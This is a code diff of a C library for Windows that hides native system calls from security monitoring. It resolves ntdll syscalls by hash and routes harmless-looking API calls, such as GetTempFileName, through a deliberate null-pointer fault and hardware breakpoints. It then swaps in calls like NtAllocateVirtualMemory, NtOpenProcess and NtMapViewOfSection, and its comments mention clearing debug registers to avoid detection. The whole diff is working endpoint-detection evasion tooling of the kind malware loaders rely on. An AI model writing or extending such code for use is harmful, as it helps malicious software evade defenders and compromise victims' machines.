@@ -3,7 +3,7 @@
 #include <stdint.h>
 #include "syscalls.h"
 #include "nt.h"
-
+#include <stdbool.h>
 #define DEBUG
 
 typedef struct _SFParams {
@@ -12,6 +12,7 @@ typedef struct _SFParams {
     DWORD FuncHash;
     DWORD_PTR param[17];
 } SFParams, * PSFParams;
+
 DWORD* NullPointer = NULL;
 SFParams Params = { 0 }; // 全局变量 用于向VEH传递真实的函数调用参数
 
@@ -19,8 +20,6 @@ SFParams Params = { 0 }; // 全局变量 用于向VEH传递真实的函数调用
 以下代码属于GitHub项目 SysWhisper3 的部分引用
 https://github.com/klezVirus/SysWhispers3
 ========================================*/
-SW3_SYSCALL_LIST SW3_SyscallList;
-
 DWORD SW3_HashSyscall(PCSTR FunctionName)
 {
     DWORD i = 0;
@@ -41,19 +40,13 @@ PVOID SC_Address(PVOID NtApiAddress)
     PVOID SyscallAddress;
     BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
     ULONG distance_to_syscall = 0x12;
-    // we don't really care if there is a 'jmp' between
-    // NtApiAddress and the 'syscall; ret' instructions
     SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
     if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
     {
-        // we can use the original code for this system call :)
         return SyscallAddress;
     }
-    // the 'syscall; ret' intructions have not been found,
-    // we will try to use one near it, similarly to HalosGate
     for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
     {
-        // let's try with an Nt* API below our syscall
         SyscallAddress = SW3_RVA2VA(
             PVOID,
             NtApiAddress,
@@ -62,7 +55,6 @@ PVOID SC_Address(PVOID NtApiAddress)
         {
             return SyscallAddress;
         }
-        // let's try with an Nt* API above our syscall
         SyscallAddress = SW3_RVA2VA(
             PVOID,
             NtApiAddress,
@@ -75,108 +67,120 @@ PVOID SC_Address(PVOID NtApiAddress)
     return NULL;
 }
 
-BOOL SW3_PopulateSyscallList()
+static PVOID GetNtdllBase()
 {
-    if (SW3_SyscallList.Count) return TRUE;
     PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
     PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
-    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
-    PVOID DllBase = NULL;
-    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
-    // in the list, so it's safer to loop through the full list and find it.
     PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
     for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
     {
-        DllBase = LdrEntry->DllBase;
+        PVOID DllBase = LdrEntry->DllBase;
         PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
         PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
         PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
         DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
         if (VirtualAddress == 0) continue;
-        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
-        // If this is NTDLL.dll, exit loop.
+        PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
         PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
         if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
-        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
+        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c)
+            return DllBase;
     }
-    if (!ExportDirectory) return FALSE;
-    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
-    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
-    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
-    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
-    // Populate SW3_SyscallList with unsorted Zw* entries.
-    DWORD i = 0;
-    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
-    do
-    {
-        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
-        // Is this a system call?
-        if (*(USHORT*)FunctionName == 0x775a)
-        {
-            Entries[i].Hash = SW3_HashSyscall(FunctionName);
-            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
-            Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));
-            i++;
-            if (i == SW3_MAX_ENTRIES) break;
-        }
-    } while (--NumberOfNames);
-    // Save total number of system calls found.
-    SW3_SyscallList.Count = i;
-    // Sort the list by address in ascending order.
-    for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
-    {
-        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
-        {
-            if (Entries[j].Address > Entries[j + 1].Address)
-            {
-                SW3_SYSCALL_ENTRY TempEntry;
-                TempEntry.Hash = Entries[j].Hash;
-                TempEntry.Address = Entries[j].Address;
-                TempEntry.SyscallAddress = Entries[j].SyscallAddress;
-                Entries[j].Hash = Entries[j + 1].Hash;
-                Entries[j].Address = Entries[j + 1].Address;
-                Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
-                Entries[j + 1].Hash = TempEntry.Hash;
-                Entries[j + 1].Address = TempEntry.Address;
-                Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
-            }
-        }
-    }
-    return TRUE;
+    return NULL;
 }
 
 PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
 {
-    // Ensure SW3_SyscallList is populated.
-    if (!SW3_PopulateSyscallList()) return NULL;
+    PVOID DllBase = GetNtdllBase();
+    if (!DllBase) return NULL;
 
-    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
+    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
+    PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
+    PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
+    DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (VirtualAddress == 0) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
+    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
+    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
+    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
+    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < NumberOfNames; i++)
     {
-        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
+        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
+        if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
         {
-            PVOID SyscallAddr = SW3_SyscallList.Entries[i].SyscallAddress;
-            memset(&SW3_SyscallList, 0, sizeof(SW3_SyscallList));
-            return SyscallAddr;
+            DWORD CurrentHash = SW3_HashSyscall(FunctionName);
+            if (CurrentHash == FunctionHash)
+            {
+                PVOID NtApiAddress = SW3_RVA2VA(PVOID, DllBase, Functions[Ordinals[i]]);
+                return SC_Address(NtApiAddress);
+            }
         }
     }
-
     return NULL;
 }
 
 DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
 {
-    // Ensure SW3_SyscallList is populated.
-    if (!SW3_PopulateSyscallList()) return -1;
+    PVOID DllBase = GetNtdllBase();
+    if (!DllBase) return -1;
 
-    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
+    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
+    PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
+    PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
+    DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (VirtualAddress == 0) return -1;
+
+    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
+    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
+    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
+    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
+    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
+
+    // 收集所有 Zw* 函数的地址并按地址排序以推导系统调用号
+    typedef struct {
+        DWORD Address;
+        DWORD Hash;
+    } SyscallEntry;
+    SyscallEntry TempEntries[600]; // 临时数组，假设最多 600 个 Zw* 函数
+    DWORD Count = 0;
+
+    for (DWORD i = 0; i < NumberOfNames; i++)
     {
-        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
+        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
+        if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
         {
-            memset(&SW3_SyscallList, 0, sizeof(SW3_SyscallList));
-            return i;
+            TempEntries[Count].Hash = SW3_HashSyscall(FunctionName);
+            TempEntries[Count].Address = Functions[Ordinals[i]];
+            Count++;
+            if (Count >= 600) break;
         }
     }
 
+    // 按地址排序
+    for (DWORD i = 0; i < Count - 1; i++)
+    {
+        for (DWORD j = 0; j < Count - i - 1; j++)
+        {
+            if (TempEntries[j].Address > TempEntries[j + 1].Address)
+            {
+                SyscallEntry Temp = TempEntries[j];
+                TempEntries[j] = TempEntries[j + 1];
+                TempEntries[j + 1] = Temp;
+            }
+        }
+    }
+
+    // 查找匹配的哈希并返回索引作为系统调用号
+    for (DWORD i = 0; i < Count; i++)
+    {
+        if (TempEntries[i].Hash == FunctionHash)
+        {
+            return i;
+        }
+    }
     return -1;
 }
 /*========================================
@@ -185,7 +189,18 @@ https://github.com/klezVirus/SysWhispers3
 ========================================*/
 
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
-    if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+    if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+        if (Params.IsLegacy == 1) {
+            pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(0x022B80BFE);
+        }
+        else {
+            pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.FuncHash);
+        }
+        pExceptInfo->ContextRecord->Dr7 = 0x00000303;
+        pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    else { // 默认其他异常都是单步异常
         pExceptInfo->ContextRecord->Rcx = Params.param[1];
         pExceptInfo->ContextRecord->Rdx = Params.param[2];
         pExceptInfo->ContextRecord->R8 = Params.param[3];
@@ -200,21 +215,11 @@ LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
         }
         if (Params.IsLegacy = 1) {
             pExceptInfo->ContextRecord->Rax = SW3_GetSyscallNumber(Params.FuncHash);
+            pExceptInfo->ContextRecord->Rip = SW3_GetSyscallAddress(Params.FuncHash);
         }
         pExceptInfo->ContextRecord->Dr0 = 0;
         pExceptInfo->ContextRecord->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
         memset(&Params, 0, sizeof(Params));
-        return EXCEPTION_CONTINUE_EXECUTION;
-    }
-    else if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
-        if (Params.IsLegacy = 1) {
-            pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(0x022B80BFE);
-        }
-        else {
-            pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.FuncHash);
-        }
-        pExceptInfo->ContextRecord->Dr7 = 0x00000303;
-        pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6;
         return EXCEPTION_CONTINUE_EXECUTION;
     }
     return EXCEPTION_CONTINUE_SEARCH;
@@ -222,15 +227,28 @@ LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
 
 // Galaxy Gate - NextGen
 NTSTATUS SFNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
-    Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)IoStatusBlock; Params.param[5] = (DWORD_PTR)AllocationSize; Params.param[6] = (DWORD_PTR)FileAttributes; Params.param[7] = (DWORD_PTR)ShareAccess; Params.param[8] = (DWORD_PTR)CreateDisposition; Params.param[9] = (DWORD_PTR)CreateOptions; Params.param[10] = (DWORD_PTR)EaBuffer; Params.param[11] = (DWORD_PTR)EaLength; Params.ParamNum = 11; Params.FuncHash = 0x0BDDB5F9C; Params.IsLegacy = 0; *NullPointer = 1; TCHAR tempFileName[MAX_PATH];
-    GetTempFileName(0, 0, 0, tempFileName);return 0;
-} // GetTempFileName -> NtCreateFile
+    Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)IoStatusBlock; Params.param[5] = (DWORD_PTR)AllocationSize; Params.param[6] = (DWORD_PTR)FileAttributes; Params.param[7] = (DWORD_PTR)ShareAccess; Params.param[8] = (DWORD_PTR)CreateDisposition; Params.param[9] = (DWORD_PTR)CreateOptions; Params.param[10] = (DWORD_PTR)EaBuffer; Params.param[11] = (DWORD_PTR)EaLength; Params.ParamNum = 11;
+    Params.IsLegacy = 0;Params.FuncHash = 0x0BDDB5F9C;*NullPointer = 1;
+    TCHAR tempFileName[MAX_PATH];GetTempFileName(0, 0, 0, tempFileName);return 0;
+}
 NTSTATUS SFNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
-    Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)Event; Params.param[3] = (DWORD_PTR)ApcRoutine; Params.param[4] = (DWORD_PTR)ApcContext; Params.param[5] = (DWORD_PTR)IoStatusBlock; Params.param[6] = (DWORD_PTR)Buffer; Params.param[7] = (DWORD_PTR)Length; Params.param[8] = (DWORD_PTR)ByteOffset; Params.param[9] = (DWORD_PTR)Key; Params.ParamNum = 9; *NullPointer = 1; Params.IsLegacy = 0;
+    Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)Event; Params.param[3] = (DWORD_PTR)ApcRoutine; Params.param[4] = (DWORD_PTR)ApcContext; Params.param[5] = (DWORD_PTR)IoStatusBlock; Params.param[6] = (DWORD_PTR)Buffer; Params.param[7] = (DWORD_PTR)Length; Params.param[8] = (DWORD_PTR)ByteOffset; Params.param[9] = (DWORD_PTR)Key; Params.ParamNum = 9;
+    Params.IsLegacy = 0;Params.FuncHash = 0x0A4B2DEA5; *NullPointer = 1;
     WritePrivateProfileString("StarFly", "Version", "2.0", "Version.ini"); return 0;
-} // WritePrivateProfileString -> NtWriteFile
+}
+NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
+    Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5;
+    Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 0; *NullPointer = 1;
+    SYSTEM_INFO si;GetSystemInfo(&si); return 0;
+}
+NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
+    Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4;
+    Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 0; *NullPointer = 1;
+    SYSTEM_INFO si;GetSystemInfo(&si); return 0;
+}
 
 // Galaxy Gate - Legacy
+NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtAccessCheck(PSECURITY_DESCRIPTOR pSecurityDescriptor, HANDLE ClientToken, ACCESS_MASK DesiaredAccess, PGENERIC_MAPPING GenericMapping, PPRIVILEGE_SET PrivilegeSet, PULONG PrivilegeSetLength, PACCESS_MASK GrantedAccess, PBOOLEAN AccessStatus) { Params.param[1] = (DWORD_PTR)pSecurityDescriptor; Params.param[2] = (DWORD_PTR)ClientToken; Params.param[3] = (DWORD_PTR)DesiaredAccess; Params.param[4] = (DWORD_PTR)GenericMapping; Params.param[5] = (DWORD_PTR)PrivilegeSet; Params.param[6] = (DWORD_PTR)PrivilegeSetLength; Params.param[7] = (DWORD_PTR)GrantedAccess; Params.param[8] = (DWORD_PTR)AccessStatus; Params.ParamNum = 8; Params.FuncHash = 0x0429E3D77; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtWorkerFactoryWorkerReady(HANDLE WorkerFactoryHandle) { Params.param[1] = (DWORD_PTR)WorkerFactoryHandle; Params.ParamNum = 1; Params.FuncHash = 0x093BB77D7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtAcceptConnectPort(PHANDLE ServerPortHandle, ULONG AlternativeReceivePortHandle, PPORT_MESSAGE ConnectionReply, BOOLEAN AcceptConnection, PPORT_SECTION_WRITE ServerSharedMemory, PPORT_SECTION_READ ClientSharedMemory) { Params.param[1] = (DWORD_PTR)ServerPortHandle; Params.param[2] = (DWORD_PTR)AlternativeReceivePortHandle; Params.param[3] = (DWORD_PTR)ConnectionReply; Params.param[4] = (DWORD_PTR)AcceptConnection; Params.param[5] = (DWORD_PTR)ServerSharedMemory; Params.param[6] = (DWORD_PTR)ClientSharedMemory; Params.ParamNum = 6; Params.FuncHash = 0x024B23D18; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
@@ -255,7 +273,6 @@ NTSTATUS SFNtQueryDefaultLocale(BOOLEAN UserProfile, PLCID DefaultLocaleId) { Pa
 NTSTATUS SFNtQueryKey(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) { Params.param[1] = (DWORD_PTR)KeyHandle; Params.param[2] = (DWORD_PTR)KeyInformationClass; Params.param[3] = (DWORD_PTR)KeyInformation; Params.param[4] = (DWORD_PTR)Length; Params.param[5] = (DWORD_PTR)ResultLength; Params.ParamNum = 5; Params.FuncHash = 0x09F0BB2AD; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) { Params.param[1] = (DWORD_PTR)KeyHandle; Params.param[2] = (DWORD_PTR)ValueName; Params.param[3] = (DWORD_PTR)KeyValueInformationClass; Params.param[4] = (DWORD_PTR)KeyValueInformation; Params.param[5] = (DWORD_PTR)Length; Params.param[6] = (DWORD_PTR)ResultLength; Params.ParamNum = 6; Params.FuncHash = 0x0261BD761; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)ZeroBits; Params.param[4] = (DWORD_PTR)RegionSize; Params.param[5] = (DWORD_PTR)AllocationType; Params.param[6] = (DWORD_PTR)Protect; Params.ParamNum = 6; Params.FuncHash = 0x00114EF73; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
-NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtWaitForMultipleObjects32(ULONG ObjectCount, PHANDLE Handles, WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout) { Params.param[1] = (DWORD_PTR)ObjectCount; Params.param[2] = (DWORD_PTR)Handles; Params.param[3] = (DWORD_PTR)WaitType; Params.param[4] = (DWORD_PTR)Alertable; Params.param[5] = (DWORD_PTR)Timeout; Params.ParamNum = 5; Params.FuncHash = 0x0B49D2D72; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtWriteFileGather(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PFILE_SEGMENT_ELEMENT SegmentArray, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) { Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)Event; Params.param[3] = (DWORD_PTR)ApcRoutine; Params.param[4] = (DWORD_PTR)ApcContext; Params.param[5] = (DWORD_PTR)IoStatusBlock; Params.param[6] = (DWORD_PTR)SegmentArray; Params.param[7] = (DWORD_PTR)Length; Params.param[8] = (DWORD_PTR)ByteOffset; Params.param[9] = (DWORD_PTR)Key; Params.ParamNum = 9; Params.FuncHash = 0x0039C6F07; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtCreateKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG TitleIndex, PUNICODE_STRING Class, ULONG CreateOptions, PULONG Disposition) { Params.param[1] = (DWORD_PTR)KeyHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)TitleIndex; Params.param[5] = (DWORD_PTR)Class; Params.param[6] = (DWORD_PTR)CreateOptions; Params.param[7] = (DWORD_PTR)Disposition; Params.ParamNum = 7; Params.FuncHash = 0x01D1D3CA6; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
@@ -267,7 +284,6 @@ NTSTATUS SFNtRequestWaitReplyPort(HANDLE PortHandle, PPORT_MESSAGE RequestMessag
 NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)MemoryInformationClass; Params.param[4] = (DWORD_PTR)MemoryInformation; Params.param[5] = (DWORD_PTR)MemoryInformationLength; Params.param[6] = (DWORD_PTR)ReturnLength; Params.ParamNum = 6; Params.FuncHash = 0x003910903; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtOpenThreadToken(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle) { Params.param[1] = (DWORD_PTR)ThreadHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)OpenAsSelf; Params.param[4] = (DWORD_PTR)TokenHandle; Params.ParamNum = 4; Params.FuncHash = 0x001D87B3C; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtQueryInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ThreadHandle; Params.param[2] = (DWORD_PTR)ThreadInformationClass; Params.param[3] = (DWORD_PTR)ThreadInformation; Params.param[4] = (DWORD_PTR)ThreadInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x022163CA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
-NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) { Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)IoStatusBlock; Params.param[3] = (DWORD_PTR)FileInformation; Params.param[4] = (DWORD_PTR)Length; Params.param[5] = (DWORD_PTR)FileInformationClass; Params.ParamNum = 5; Params.FuncHash = 0x015852515; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) { Params.param[1] = (DWORD_PTR)SectionHandle; Params.param[2] = (DWORD_PTR)ProcessHandle; Params.param[3] = (DWORD_PTR)BaseAddress; Params.param[4] = (DWORD_PTR)ZeroBits; Params.param[5] = (DWORD_PTR)CommitSize; Params.param[6] = (DWORD_PTR)SectionOffset; Params.param[7] = (DWORD_PTR)ViewSize; Params.param[8] = (DWORD_PTR)InheritDisposition; Params.param[9] = (DWORD_PTR)AllocationType; Params.param[10] = (DWORD_PTR)Win32Protect; Params.ParamNum = 10; Params.FuncHash = 0x0E0C7A011; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
